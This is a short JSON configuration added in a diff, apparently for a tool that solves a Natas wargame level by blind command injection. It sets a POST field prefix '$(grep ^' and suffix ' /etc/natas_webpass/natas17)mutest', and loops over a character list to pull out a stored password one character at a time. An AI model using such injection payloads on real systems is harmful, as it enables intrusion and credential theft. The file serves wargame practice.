@@ -1,0 +1,15 @@
+{
+    "hint":"COMMAND Injection",
+    "listedChar": "QWERTYUIOPASDFGHJKLLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789",
+    "method":"POST",
+    "isFormData": true,
+    "body":{
+        "needle": ""
+    },
+    "searchParams": ["needle"],
+    "prefixValue": "$(grep ^",
+    "suffixValue": " /etc/natas_webpass/natas17)mutest",
+    "ongoing": true,
+    "stopOnChangeContent": true,
+    "maxCount": 63
+}
